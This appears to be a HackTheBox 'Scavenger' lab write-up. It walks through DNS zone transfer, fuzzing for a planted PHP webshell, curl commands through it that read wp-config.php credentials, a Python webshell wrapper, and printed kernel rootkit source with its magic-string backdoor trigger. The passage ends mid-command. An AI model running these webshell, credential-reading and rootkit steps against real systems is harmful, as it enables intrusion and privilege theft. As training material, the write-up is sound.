+
+<p><a href="/assets/img/writeups/hackthebox/machines/scavenger/scavenger.htb_rentahacker.htb.png" data-toggle="lightbox"><img src="/assets/img/writeups/hackthebox/machines/scavenger/scavenger.htb_rentahacker.htb.png" alt="Scavenger RentaHacker Wordpress Screenshot" class="img-fluid" /></a></p>
+
+<p>From a quick glance at exploits relating to these <code class="highlighter-rouge">Prestashop</code> and <code class="highlighter-rouge">Wordpress</code> the most recents require <em>Admin</em> access. So we may be looking for creds.</p>
+
+<p>Taking a closer look at <code class="highlighter-rouge">rentahacker.htb</code> we notice a few comments on the post <code class="highlighter-rouge">http://www.rentahacker.htb/2018/12/10/rent-a-hacker/</code>:</p>
+
+<p><a href="/assets/img/writeups/hackthebox/machines/scavenger/scavenger.htb_rentahacker.htb-comments.png" data-toggle="lightbox"><img src="/assets/img/writeups/hackthebox/machines/scavenger/scavenger.htb_rentahacker.htb-comments.png" alt="Scavenger RentaHacker Wordpress Comments Screenshot" class="img-fluid" /></a></p>
+
+<p>The comment by <code class="highlighter-rouge">31173 HAXXOR team</code> hints at a bug tracking webapp that apparently has already been hacked. We may need to enumerate for subdomains.</p>
+
+<p>From this we can probably say that we have also found our theme relating to the box name.</p>
+
+<p>We may have to <code class="highlighter-rouge">scavenge</code> for things the previous hacker has left behind!</p>
+
+<h3 id="dns-service">DNS Service</h3>
+
+<p>Since we know that <code class="highlighter-rouge">supersechosting.htb</code> offers <em>DNS</em> resolution services as per their website let’s try finding some info through port <code class="highlighter-rouge">53</code> with the <code class="highlighter-rouge">dig</code> command.</p>
+
+<p>We will use the <code class="highlighter-rouge">AXFR</code> protocol which is used for <em>DNS</em> zone transfers and will hopefully allow us to dump all information about the given domain:</p>
+
+<figure class="highlight"><pre><code class="language-bash" data-lang="bash">dig axfr rentahacker.htb @scavenger.htb                                                                                                                            
+
+<span class="p">;</span> &lt;&lt;<span class="o">&gt;&gt;</span> DiG 9.11.5-P4-5.1+b1-Debian &lt;&lt;<span class="o">&gt;&gt;</span> axfr rentahacker.htb @scavenger.htb
+<span class="p">;;</span> global options: +cmd
+rentahacker.htb.        604800  IN      SOA     ns1.supersechosting.htb. root.supersechosting.htb. 4 604800 86400 2419200 604800
+rentahacker.htb.        604800  IN      NS      ns1.supersechosting.htb.
+rentahacker.htb.        604800  IN      MX      10 mail1.rentahacker.htb.
+rentahacker.htb.        604800  IN      A       10.10.10.155
+mail1.rentahacker.htb.  604800  IN      A       10.10.10.155
+sec03.rentahacker.htb.  604800  IN      A       10.10.10.155
+www.rentahacker.htb.    604800  IN      A       10.10.10.155
+rentahacker.htb.        604800  IN      SOA     ns1.supersechosting.htb. root.supersechosting.htb. 4 604800 86400 2419200 604800
+<span class="p">;;</span> Query <span class="nb">time</span>: 427 msec
+<span class="p">;;</span> SERVER: 10.10.10.155#53<span class="o">(</span>10.10.10.155<span class="o">)</span>
+<span class="p">;;</span> WHEN: Wed Feb 12 04:47:24 PST 2020
+<span class="p">;;</span> XFR size: 8 records <span class="o">(</span>messages 1, bytes 251<span class="o">)</span></code></pre></figure>
+
+<p>We see that we reveal the subdomain <code class="highlighter-rouge">sec03.rentahacker.htb</code>.</p>
+
+<p>Let’s add that to our <code class="highlighter-rouge">/etc/hosts</code> (the list is getting long now) and see what we can find:</p>
+
+<p><a href="/assets/img/writeups/hackthebox/machines/scavenger/scavenger.htb_sec03.rentahacker.htb.png" data-toggle="lightbox"><img src="/assets/img/writeups/hackthebox/machines/scavenger/scavenger.htb_sec03.rentahacker.htb.png" alt="Scavenger Sec03 Comments Screenshot" class="img-fluid" /></a></p>
+
+<p>So we have found the site that <code class="highlighter-rouge">31173 HAXXOR team</code> said they hacked. They mentioned it was a bugtracking webapp.</p>
+
+<p>Knowing that the webapp is potentially written in <em>PHP</em> navigating to <code class="highlighter-rouge">index.php</code> redirects to the <em>Mantis Bug Tracker</em> login page at <code class="highlighter-rouge">http://sec03.rentahacker.htb/login_page.php</code>:</p>
+
+<p><a href="/assets/img/writeups/hackthebox/machines/scavenger/scavenger.htb_sec03.rentahacker.htb-mantisbt.png" data-toggle="lightbox"><img src="/assets/img/writeups/hackthebox/machines/scavenger/scavenger.htb_sec03.rentahacker.htb-mantisbt.png" alt="Scavenger Sec03 MantisBT Screenshot" class="img-fluid" /></a></p>
+
+<p>At the login page we see the message: <code class="highlighter-rouge">Warning: You should disable the default 'administrator' account or change its password.</code> This tells us that the default credentials may not have been changed!</p>
+
+<p>Trying the default login <code class="highlighter-rouge">administrator:root</code> we get access:</p>
+
+<p><a href="/assets/img/writeups/hackthebox/machines/scavenger/scavenger.htb_sec03.rentahacker.htb-mantisbt_admin.png" data-toggle="lightbox"><img src="/assets/img/writeups/hackthebox/machines/scavenger/scavenger.htb_sec03.rentahacker.htb-mantisbt_admin.png" alt="Scavenger Sec03 MantisBT Screenshot" class="img-fluid" /></a></p>
+
+<p>Taking a look around we don’t find anything interesting and checking the exploits available for the version reveals no vulnerabilities.</p>
+
+<h2 id="foothold">Foothold</h2>
+
+<p>While we look around a bit more let’s setup <em>Burp Suite’s</em> <code class="highlighter-rouge">intruder</code> and enumerate for directories as well as filenames:</p>
+
+<p><a href="/assets/img/writeups/hackthebox/machines/scavenger/scavenger.htb_sec03.rentahacker.htb_burp-intruder_filenames.png" data-toggle="lightbox"><img src="/assets/img/writeups/hackthebox/machines/scavenger/scavenger.htb_sec03.rentahacker.htb_burp-intruder_filenames.png" alt="Scavenger Burp Intruder Filenames Screenshot" class="img-fluid" /></a></p>
+
+<p>And from the <code class="highlighter-rouge">payloads</code> tab we can load our wordlist. We will use <code class="highlighter-rouge">big.txt</code>.</p>
+
+<p>Our results reveal a file called <code class="highlighter-rouge">shell.php</code>:</p>
+
+<p><a href="/assets/img/writeups/hackthebox/machines/scavenger/scavenger.htb_sec03.rentahacker.htb_burp-intruder_shell-filename.png" data-toggle="lightbox"><img src="/assets/img/writeups/hackthebox/machines/scavenger/scavenger.htb_sec03.rentahacker.htb_burp-intruder_shell-filename.png" alt="Scavenger Burp Intruder Shell Screenshot" class="img-fluid" /></a></p>
+
+<p>Alternativley we can use <code class="highlighter-rouge">wfuzz</code>:</p>
+
+<figure class="highlight"><pre><code class="language-bash" data-lang="bash">wfuzz <span class="nt">-w</span> /usr/share/wordlists/dirb/big.txt <span class="nt">--sc</span> 200 http://sec03.rentahacker.htb/FUZZ.php
+
+<span class="k">********************************************************</span>
+<span class="k">*</span> Wfuzz 2.4 - The Web Fuzzer                           <span class="k">*</span>
+<span class="k">********************************************************</span>
+
+Target: http://sec03.rentahacker.htb/FUZZ.php
+Total requests: 959
+
+<span class="o">===================================================================</span>
+ID           Response   Lines    Word     Chars       Payload                                                                                                                    
+<span class="o">===================================================================</span>
+
+000000231:   200        0 L      0 W      0 Ch        <span class="s2">"core"</span>                                                                                                                     
+000000498:   200        57 L     339 W    4712 Ch     <span class="s2">"login"</span> 
+    .... SNIP ....      .... SNIP ....      .... SNIP ....                                                                                                                   
+000000752:   200        0 L      0 W      0 Ch        <span class="s2">"shell"</span>                                                                                                                    
+000000881:   200        57 L     332 W    4667 Ch     <span class="s2">"view"</span>                                                                                                                     
+
+Total <span class="nb">time</span>: 35.68731
+Processed Requests: 959
+Filtered Requests: 955
+Requests/sec.: 26.87229</code></pre></figure>
+
+<p>Looks like we have a webshell! Trying a few common parameters returns nothing!</p>
+
+<p>Let’s once again setup <em>Burp Suite’s</em> <code class="highlighter-rouge">intruder</code> this time looking for the webshells parameter:</p>
+
+<p><a href="/assets/img/writeups/hackthebox/machines/scavenger/scavenger.htb_sec03.rentahacker.htb_burp-intruder_shell-param.png" data-toggle="lightbox"><img src="/assets/img/writeups/hackthebox/machines/scavenger/scavenger.htb_sec03.rentahacker.htb_burp-intruder_shell-param.png" alt="Scavenger Burp Intruder Shell Parameter Screenshot" class="img-fluid" /></a></p>
+
+<p>And from the payloads tab we can load our wordlist. Once again using big.txt.</p>
+
+<p>Our results reveal the parameter <code class="highlighter-rouge">hidden</code>:</p>
+
+<p><a href="/assets/img/writeups/hackthebox/machines/scavenger/scavenger.htb_sec03.rentahacker.htb_burp-intruder_shell-param_hidden.png" data-toggle="lightbox"><img src="/assets/img/writeups/hackthebox/machines/scavenger/scavenger.htb_sec03.rentahacker.htb_burp-intruder_shell-param_hidden.png" alt="Scavenger Burp Intruder Shell Parameter Hidden Screenshot" class="img-fluid" /></a></p>
+
+<p>Alternatively using <code class="highlighter-rouge">wfuzz</code>:</p>
+
+<figure class="highlight"><pre><code class="language-bash" data-lang="bash">wfuzz <span class="nt">-c</span> <span class="nt">-w</span> /usr/share/wordlists/dirb/big.txt <span class="nt">--filter</span> <span class="s2">"w&gt;0"</span> http://sec03.rentahacker.htb/shell.php?FUZZ<span class="o">=</span><span class="nb">ls</span>
+
+<span class="k">********************************************************</span>
+<span class="k">*</span> Wfuzz 2.4 - The Web Fuzzer                           <span class="k">*</span>
+<span class="k">********************************************************</span>
+
+Target: http://sec03.rentahacker.htb/shell.php?FUZZ<span class="o">=</span><span class="nb">ls
+</span>Total requests: 959
+
+<span class="o">===================================================================</span>
+ID           Response   Lines    Word     Chars       Payload                                                                                                                    
+<span class="o">===================================================================</span>
+
+000000407:   200        225 L    225 W    4907 Ch     <span class="s2">"hidden"</span>                                                                                                                   
+
+Total <span class="nb">time</span>: 35.92109
+Processed Requests: 959
+Filtered Requests: 958
+Requests/sec.: 26.69740</code></pre></figure>
+
+<p>Finally we have <code class="highlighter-rouge">RCE</code> with the user <code class="highlighter-rouge">ib01c03</code>:</p>
+
+<figure class="highlight"><pre><code class="language-bash" data-lang="bash">curl http://sec03.rentahacker.htb/shell.php?hidden<span class="o">=</span><span class="nb">id
+</span><span class="nv">uid</span><span class="o">=</span>1003<span class="o">(</span>ib01c03<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>1004<span class="o">(</span>customers<span class="o">)</span> <span class="nb">groups</span><span class="o">=</span>1004<span class="o">(</span>customers<span class="o">)</span></code></pre></figure>
+
+<p>Now that we have access to the <em>Mantis BT</em> and <em>Wordpress</em> files let’s get the database creds to see if there has been password reuse:</p>
+
+<figure class="highlight"><pre><code class="language-bash" data-lang="bash">curl http://sec03.rentahacker.htb/shell.php?hidden<span class="o">=</span><span class="nb">cat</span>%20/home/ib01c03/www/wp-config.php
+&lt;?php
+    .... SNIP ....      .... SNIP ....      .... SNIP ....   
+// <span class="k">**</span> MySQL settings - You can get this info from your web host <span class="k">**</span> //
+/<span class="k">**</span> The name of the database <span class="k">for </span>WordPress <span class="k">*</span>/
+define<span class="o">(</span><span class="s1">'DB_NAME'</span>, <span class="s1">'ib01c03'</span><span class="o">)</span><span class="p">;</span>
+
+/<span class="k">**</span> MySQL database username <span class="k">*</span>/
+define<span class="o">(</span><span class="s1">'DB_USER'</span>, <span class="s1">'ib01c03'</span><span class="o">)</span><span class="p">;</span>
+
+/<span class="k">**</span> MySQL database password <span class="k">*</span>/
+define<span class="o">(</span><span class="s1">'DB_PASSWORD'</span>, <span class="s1">'Thi$....Gut'</span><span class="o">)</span><span class="p">;</span>
+    .... SNIP ....      .... SNIP ....      .... SNIP ....   
+require_once<span class="o">(</span>ABSPATH <span class="nb">.</span> <span class="s1">'wp-settings.php'</span><span class="o">)</span><span class="p">;</span></code></pre></figure>
+
+<p>Using the database <code class="highlighter-rouge">username</code> and <code class="highlighter-rouge">password</code> we can access <code class="highlighter-rouge">ib01c03</code> <em>FTP</em> account but we just have the same access.</p>
+
+<p>Since we will be working with the webshell let’s make life a little easier by creating ourselves a limited shell:</p>
+
+<figure class="highlight"><pre><code class="language-python" data-lang="python"><span class="c1">#!/usr/bin/python
+</span>
+<span class="kn">import</span> <span class="nn">os</span>
+<span class="kn">import</span> <span class="nn">urllib</span>
+
+<span class="k">class</span> <span class="nc">Shell</span><span class="p">():</span>
+    <span class="k">def</span> <span class="nf">__init__</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">addr</span><span class="o">=</span><span class="s">"http://sec03.rentahacker.htb/shell.php?hidden="</span><span class="p">):</span>
+        <span class="bp">self</span><span class="o">.</span><span class="n">url</span> <span class="o">=</span> <span class="n">addr</span>
+    <span class="k">def</span> <span class="nf">run_cmd</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">cmd</span><span class="p">):</span>
+        <span class="n">cmd</span> <span class="o">=</span> <span class="n">urllib</span><span class="o">.</span><span class="n">quote_plus</span><span class="p">(</span><span class="n">cmd</span><span class="p">)</span>
+        <span class="n">curl</span> <span class="o">=</span> <span class="s">"curl -X GET "</span>
+        <span class="n">result</span> <span class="o">=</span> <span class="n">os</span><span class="o">.</span><span class="n">system</span><span class="p">(</span><span class="n">curl</span> <span class="o">+</span> <span class="bp">self</span><span class="o">.</span><span class="n">url</span> <span class="o">+</span> <span class="n">cmd</span><span class="p">)</span>
+        <span class="k">return</span><span class="p">(</span><span class="n">result</span><span class="p">)</span>
+    <span class="k">def</span> <span class="nf">cmd_prompt</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
+        <span class="n">res</span> <span class="o">=</span> <span class="s">''</span>
+        <span class="k">while</span> <span class="n">res</span> <span class="o">!=</span> <span class="s">'exit'</span><span class="p">:</span>
+            <span class="n">res</span> <span class="o">=</span> <span class="nb">raw_input</span><span class="p">(</span><span class="s">"$ "</span><span class="p">)</span>
+            <span class="k">if</span> <span class="n">res</span> <span class="o">==</span> <span class="s">'exit'</span><span class="p">:</span>
+                <span class="k">pass</span>
+            <span class="k">else</span><span class="p">:</span>
+                <span class="bp">self</span><span class="o">.</span><span class="n">run_cmd</span><span class="p">(</span><span class="n">res</span><span class="p">)</span></code></pre></figure>
+
+<p>Short and nasty but does the job!</p>
+
+<p>Looking in the home directory we find the following:</p>
+
+<figure class="highlight"><pre><code class="language-bash" data-lang="bash">ipython
+In <span class="o">[</span>1]: import limited_shell
+In <span class="o">[</span>2]: a <span class="o">=</span> limited_shell.Shell<span class="o">()</span>
+In <span class="o">[</span>3]: a.cmd_prompt<span class="o">()</span>
+<span class="nv">$ </span><span class="nb">ls</span> /home
+ib01c01 ib01c02 ib01c03 ib01ftp ib01www support</code></pre></figure>
+
+<p>Taking a look around we find something in <code class="highlighter-rouge">/var/mail</code>.</p>
+
+<p>We find the following email containing some credentials:</p>
+
+<figure class="highlight"><pre><code class="language-bash" data-lang="bash"><span class="nb">cat</span> /var/mail/ib01c03
+From support@ib01.supersechosting.htb Mon Dec 10 21:10:56 2018
+Return-path: &lt;support@ib01.supersechosting.htb&gt;
+Envelope-to: ib01c03@ib01.supersechosting.htb
+Delivery-date: Mon, 10 Dec 2018 21:10:56 +0100
+Received: from support by ib01.supersechosting.htb with <span class="nb">local</span> <span class="o">(</span>Exim 4.89<span class="o">)</span>
+        <span class="o">(</span>envelope-from &lt;support@ib01.supersechosting.htb&gt;<span class="o">)</span>
+        <span class="nb">id </span>1gWRtI-0000ZK-8Q
+        <span class="k">for </span>ib01c03@ib01.supersechosting.htb<span class="p">;</span> Mon, 10 Dec 2018 21:10:56 +0100
+To: &lt;ib01c03@ib01.supersechosting.htb&gt;
+Subject: Re: Please <span class="nb">help</span><span class="o">!</span> Site Defaced!
+In-Reply-To: Your message of Mon, 10 Dec 2018 21:04:49 +0100
+        &lt;E1gWRnN-0000XA-44@ib01.supersechosting.htb&gt;
+References: &lt;E1gWRnN-0000XA-44@ib01.supersechosting.htb&gt;
+X-Mailer: mail <span class="o">(</span>GNU Mailutils 3.1.1<span class="o">)</span>
+Message-Id: &lt;E1gWRtI-0000ZK-8Q@ib01.supersechosting.htb&gt;
+From: support &lt;support@ib01.supersechosting.htb&gt;
+Date: Mon, 10 Dec 2018 21:10:56 +0100
+X-IMAPbase: 1544472964 2
+Status: O
+X-UID: 1
+
+<span class="o">&gt;&gt;</span> Please we need your help. Our site has been defaced!
+<span class="o">&gt;&gt;</span> What we should <span class="k">do </span>now?
+<span class="o">&gt;&gt;</span>
+<span class="o">&gt;&gt;</span> rentahacker.htb
+
+Hi, we will check when possible. We are working on another incident right now. We just make a backup of the apache logs.
+Please check <span class="k">if </span>there is any strange file <span class="k">in </span>your web root and upload it to the ftp server:
+ftp.supersechosting.htb
+user: ib01ftp
+pass: Yhg...._Ta
+
+Thanks.</code></pre></figure>
+
+<p>Logging in via <em>FTP</em> we find a directory called <code class="highlighter-rouge">incident</code> that contains two other directories called <code class="highlighter-rouge">ib01c01</code> and <code class="highlighter-rouge">ib01c03</code>.</p>
+
+<p>We are more interested in moving to another user so we will check out the <code class="highlighter-rouge">ib01c01</code> directory first:</p>
+
+<figure class="highlight"><pre><code class="language-shell" data-lang="shell">ftp&gt; <span class="nb">ls
+</span>200 PORT <span class="nb">command </span>successful. Consider using PASV.
+150 Here comes the directory listing.
+<span class="nt">-r--rw-r--</span>    1 1005     1000        10427 Dec 10  2018 ib01c01.access.log
+<span class="nt">-rw-r--r--</span>    1 1000     1000       835084 Dec 10  2018 ib01c01_incident.pcap
+<span class="nt">-r--rw-r--</span>    1 1005     1000          173 Dec 11  2018 notes.txt</code></pre></figure>
+
+<p>Let’s download the files with the <code class="highlighter-rouge">get</code> command and see what we have got. The <code class="highlighter-rouge">pcap</code> will be our main area of focus!</p>
+
+<p>From our enumeration of <code class="highlighter-rouge">apache</code> configuration files we know that the <code class="highlighter-rouge">ib01c01</code> user runs the <code class="highlighter-rouge">http://www.pwnhats.htb</code> website. Also as per our enumeration we know that website is running <em>PrestaShop</em>. We will be looking for the administration backend.</p>
+
+<p>Opening up the <code class="highlighter-rouge">pcap</code> file in <em>Wireshark</em> we set the filter <code class="highlighter-rouge">http.request.method == POST</code> and quickly see our target location.</p>
+
+<p>We right click and slect <code class="highlighter-rouge">Follow</code> and then <code class="highlighter-rouge">TCP Stream</code>:</p>
+
+<p><a href="/assets/img/writeups/hackthebox/machines/scavenger/scavenger.htb_ib01c01-pcap-post_select-tcp-stream.png" data-toggle="lightbox"><img src="/assets/img/writeups/hackthebox/machines/scavenger/scavenger.htb_ib01c01-pcap-post_select-tcp-stream.png" alt="Scavenger Wireshark Pcap Screenshot" class="img-fluid" /></a></p>
+
+<p>We then see our <code class="highlighter-rouge">POST</code> request with the <code class="highlighter-rouge">email</code> and <code class="highlighter-rouge">password</code>:</p>
+
+<p><a href="/assets/img/writeups/hackthebox/machines/scavenger/scavenger.htb_ib01c01-pcap-post_tcp-stream.png" data-toggle="lightbox"><img src="/assets/img/writeups/hackthebox/machines/scavenger/scavenger.htb_ib01c01-pcap-post_tcp-stream.png" alt="Scavenger Wireshark Pcap Post Stream" class="img-fluid" /></a></p>
+
+<p>We can confirm the credentials at <code class="highlighter-rouge">http://www.pwnhats.htb/admin530o6uisg</code> and logging in with the details.</p>
+
+<p>During enumeration of the filter <code class="highlighter-rouge">http.request.method == GET</code> in <em>WireShark</em> we also see something of interest referencing <code class="highlighter-rouge">root.c</code>:</p>
+
+<p><a href="/assets/img/writeups/hackthebox/machines/scavenger/scavenger.htb_ib01c01-pcap-get_filter.png" data-toggle="lightbox"><img src="/assets/img/writeups/hackthebox/machines/scavenger/scavenger.htb_ib01c01-pcap-get_filter.png" alt="Scavenger Wireshark Pcap Root.c" class="img-fluid" /></a></p>
+
+<p>Taking a look at the <code class="highlighter-rouge">TCP Stream</code> of these items we see a <code class="highlighter-rouge">Makefile</code> which looks like it is to do with <em>Kernel</em> modules and the <code class="highlighter-rouge">root.c</code> files that contains <code class="highlighter-rouge">C</code> code for what seems to be performing privilege escalation:</p>
+
+<p><a href="/assets/img/writeups/hackthebox/machines/scavenger/scavenger.htb_ib01c01-pcap-get_tcp-stream_root-c.png" data-toggle="lightbox"><img src="/assets/img/writeups/hackthebox/machines/scavenger/scavenger.htb_ib01c01-pcap-get_tcp-stream_root-c.png" alt="Scavenger Wireshark Pcap Root.c Stream" class="img-fluid" /></a></p>
+
+<p>Straight off the mark there is a line that seems quite distinct <code class="highlighter-rouge">MODULE_DESCRIPTION("Got r00t!.");</code>. A quick search online reveals a forum <a href="https://0x00sec.org/t/kernel-rootkits-getting-your-hands-dirty/1485">post</a> detailing the privilege escalation.</p>
+
+<p>We see that a device is created called <code class="highlighter-rouge">/dev/ttyR0</code> and the permissions <code class="highlighter-rouge">666</code> is set. A check on the machine reveals that we in fact have that device with those permissions:</p>
+
+<figure class="highlight"><pre><code class="language-bash" data-lang="bash"><span class="nb">ls</span> <span class="nt">-l</span> /dev/ttyR0
+crw-rw-rw- 1 root dialout 248, 0 Feb 18 10:54 /dev/ttyR0</code></pre></figure>
+
+<p>To execute the privilege escalation the attacker does a simple command but it does not seem to work:</p>
+
+<figure class="highlight"><pre><code class="language-bash" data-lang="bash"><span class="nb">echo</span> <span class="s2">"g0tR0ot"</span> <span class="o">&gt;</span> /dev/ttyR0 <span class="o">&amp;&amp;</span> <span class="nb">id</span></code></pre></figure>
+
+<p>Taking a look into the code <code class="highlighter-rouge">g0tR0ot</code> is meant to be a <em>“magic”</em> string that is a <em>backdoor</em>. Obviously this magic string has been changed hence why it does not work.</p>
+
+<p>Further reading shows that <code class="highlighter-rouge">root.c</code> compiles to <code class="highlighter-rouge">root.ko</code> a <em>Kernel</em> module that is loaded with <code class="highlighter-rouge">insmod</code>.</p>
+
+<p>A quick search of the system does not show a file with that name so we can safely assume it is most likely within <code class="highlighter-rouge">ib01c01</code>’s home directory.</p>
+
+<h2 id="user">User</h2>
+
+<p>Although we know that the version of <em>PrestaShop</em> installed is vulnerable we will check if there has been a case of password reuse with user <code class="highlighter-rouge">ib01c01</code>:</p>
+
+<figure class="highlight"><pre><code class="language-bash" data-lang="bash">ftp 10.10.10.155                                                                                                                                                                      
+Connected to 10.10.10.155.
+220 <span class="o">(</span>vsFTPd 3.0.3<span class="o">)</span>
+Name <span class="o">(</span>10.10.10.155:root<span class="o">)</span>: ib01c01
+331 Please specify the password.
+Password:
+230 Login successful.
+Remote system <span class="nb">type </span>is UNIX.
+Using binary mode to transfer files.
+ftp&gt; <span class="nb">ls</span> <span class="nt">-la</span>
+200 PORT <span class="nb">command </span>successful. Consider using PASV.
+150 Here comes the directory listing.
+drwx------    5 1001     1004         4096 Feb 19 08:54 <span class="nb">.</span>
+drwxr-xr-x    8 0        0            4096 Dec 07  2018 ..
+drwxr-xr-x    2 1001     1004         4096 Feb 02  2019 ...
+<span class="nt">-rw-------</span>    1 0        0               0 Dec 11  2018 .bash_history
+drwx------    2 1001     1004         4096 Feb 19 08:46 .ssh
+<span class="nt">-rw-------</span>    1 1001     1004           32 Jan 30  2019 access.txt
+<span class="nt">-rw-r--r--</span>    1 1001     1004     68175351 Dec 07  2018 prestashop_1.7.4.4.zip
+<span class="nt">-rw-r--r--</span>    1 1001     1004       469773 Feb 19 08:54 search.txt
+<span class="nt">-rw-r-----</span>    1 0        1004           33 Dec 07  2018 user.txt
+drwxr-xr-x   27 1001     1004         4096 Feb 19 09:05 www
+226 Directory send OK.
+ftp&gt; get user.txt -
+remote: user.txt
+200 PORT <span class="nb">command </span>successful. Consider using PASV.
+150 Opening BINARY mode data connection <span class="k">for </span>user.txt <span class="o">(</span>33 bytes<span class="o">)</span><span class="nb">.</span>
+6f8a8a832e....903dcc804d
+226 Transfer complete.
+33 bytes received <span class="k">in </span>0.00 secs <span class="o">(</span>93.4103 kB/s<span class="o">)</span></code></pre></figure>
+
+<p>We find that we have <em>FTP</em> access and grab the <code class="highlighter-rouge">user.txt</code> flag! Now on to <code class="highlighter-rouge">root</code>.</p>
+
+<h2 id="root">Root</h2>
+
+<p>In the above <em>FTP</em> directory listing we notice a folder somewhat <em>“disguised”</em> with the name <code class="highlighter-rouge">...</code></p>
+
+<p>Moving in to the directory we find our file:</p>
+
+<figure class="highlight"><pre><code class="language-shell" data-lang="shell">ftp&gt; <span class="nb">cd</span> ...
+250 Directory successfully changed.
+ftp&gt; <span class="nb">ls</span> <span class="nt">-la</span>
+200 PORT <span class="nb">command </span>successful. Consider using PASV.
+150 Here comes the directory listing.
+drwxr-xr-x    2 1001     1004         4096 Feb 02  2019 <span class="nb">.</span>
+drwx------    5 1001     1004         4096 Feb 19 08:54 ..
+<span class="nt">-rw-r--r--</span>    1 0        0          399400 Feb 02  2019 root.ko
+226 Directory send OK.</code></pre></figure>
+
+<p>We can download it and investigate further.</p>
+
+<p>Looking again at the code for <code class="highlighter-rouge">root.c</code> we know that we are interested in the <code class="highlighter-rouge">root_write()</code> function where the <em>magic</em> string is declared:</p>
+
+<figure class="highlight"><pre><code class="language-c" data-lang="c"><span class="n">root_write</span> <span class="p">(</span><span class="k">struct</span> <span class="n">file</span> <span class="o">*</span><span class="n">f</span><span class="p">,</span> <span class="k">const</span> <span class="kt">char</span> <span class="n">__user</span> <span class="o">*</span><span class="n">buf</span><span class="p">,</span> <span class="kt">size_t</span> <span class="n">len</span><span class="p">,</span> <span class="n">loff_t</span> <span class="o">*</span><span class="n">off</span><span class="p">)</span>
+<span class="p">{</span> 
+  <span class="kt">char</span>   <span class="o">*</span><span class="n">data</span><span class="p">;</span>
+  <span class="kt">char</span>   <span class="n">magic</span><span class="p">[]</span> <span class="o">=</span> <span class="s">"g0tR0ot"</span><span class="p">;</span>
+
+  <span class="k">struct</span> <span class="n">cred</span> <span class="o">*</span><span class="n">new_cred</span><span class="p">;</span>
+  
+  <span class="n">data</span> <span class="o">=</span> <span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="p">)</span> <span class="n">kmalloc</span> <span class="p">(</span><span class="n">len</span> <span class="o">+</span> <span class="mi">1</span><span class="p">,</span> <span class="n">GFP_KERNEL</span><span class="p">);</span>
+    
+  <span class="k">if</span> <span class="p">(</span><span class="n">data</span><span class="p">)</span>
+    <span class="p">{</span>
+      <span class="n">copy_from_user</span> <span class="p">(</span><span class="n">data</span><span class="p">,</span> <span class="n">buf</span><span class="p">,</span> <span class="n">len</span><span class="p">);</span>
+        <span class="k">if</span> <span class="p">(</span><span class="n">memcmp</span><span class="p">(</span><span class="n">data</span><span class="p">,</span> <span class="n">magic</span><span class="p">,</span> <span class="mi">7</span><span class="p">)</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span>
+      <span class="p">{</span>
+        <span class="k">if</span> <span class="p">((</span><span class="n">new_cred</span> <span class="o">=</span> <span class="n">prepare_creds</span> <span class="p">())</span> <span class="o">==</span> <span class="nb">NULL</span><span class="p">)</span>
+          <span class="p">{</span>
+        <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+          <span class="p">}</span>
+        <span class="n">V</span><span class="p">(</span><span class="n">new_cred</span><span class="o">-&gt;</span><span class="n">uid</span><span class="p">)</span> <span class="o">=</span> <span class="n">V</span><span class="p">(</span><span class="n">new_cred</span><span class="o">-&gt;</span><span class="n">gid</span><span class="p">)</span> <span class="o">=</span>  <span class="mi">0</span><span class="p">;</span>
+        <span class="n">V</span><span class="p">(</span><span class="n">new_cred</span><span class="o">-&gt;</span><span class="n">euid</span><span class="p">)</span> <span class="o">=</span> <span class="n">V</span><span class="p">(</span><span class="n">new_cred</span><span class="o">-&gt;</span><span class="n">egid</span><span class="p">)</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+        <span class="n">V</span><span class="p">(</span><span class="n">new_cred</span><span class="o">-&gt;</span><span class="n">suid</span><span class="p">)</span> <span class="o">=</span> <span class="n">V</span><span class="p">(</span><span class="n">new_cred</span><span class="o">-&gt;</span><span class="n">sgid</span><span class="p">)</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+        <span class="n">V</span><span class="p">(</span><span class="n">new_cred</span><span class="o">-&gt;</span><span class="n">fsuid</span><span class="p">)</span> <span class="o">=</span> <span class="n">V</span><span class="p">(</span><span class="n">new_cred</span><span class="o">-&gt;</span><span class="n">fsgid</span><span class="p">)</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+        <span class="n">commit_creds</span> <span class="p">(</span><span class="n">new_cred</span><span class="p">);</span>
+      <span class="p">}</span>
+        <span class="n">kfree</span><span class="p">(</span><span class="n">data</span><span class="p">);</span>
+      <span class="p">}</span>
+    
+    <span class="k">return</span> <span class="n">len</span><span class="p">;</span>
+<span class="p">}</span></code></pre></figure>
+
+<p>Taking a look at <code class="highlighter-rouge">root.ko</code> in <em>IDA</em> we can take a look at the function and the <em>pseudocode</em> for it:</p>
+
+<p><a href="/assets/img/writeups/hackthebox/machines/scavenger/scavenger.htb_IDA_root-ko.png" data-toggle="lightbox"><img src="/assets/img/writeups/hackthebox/machines/scavenger/scavenger.htb_IDA_root-ko.png" alt="Scavenger Wireshark Root.ko" class="img-fluid" /></a></p>
+
+<p>We see three strings:</p>
+
+<figure class="highlight"><pre><code class="language-shell" data-lang="shell">strcpy<span class="o">(</span>a, <span class="s2">"g3t"</span><span class="o">)</span><span class="p">;</span>
+strcpy<span class="o">(</span>b, <span class="s2">"Pr1v"</span><span class="o">)</span><span class="p">;</span>
+strcpy<span class="o">(</span>magic, <span class="s2">"g0tR0ot"</span><span class="o">)</span><span class="p">;</span></code></pre></figure>
+
+<p>Since we know that the two strings <code class="highlighter-rouge">g3t</code> and <code class="highlighter-rouge">Pr1v</code> are not in the original code we can safely assume that these two strings are concatenated together to make the <em>“magic”</em> string. Looking further down the pseudocode we see that this is the case.</p>
+
+<p>Let’s go try it out back at our limited shell for <code class="highlighter-rouge">ib01c03</code>:</p>
+
+<figure class="highlight"><pre><code class="language-bash" data-lang="bash"><span class="nb">echo</span> <span class="s2">"g3tPr1v"</span> <span class="o">&gt;</span> /dev/ttyR0 <span class="o">&amp;&amp;</span> <span class="nb">id
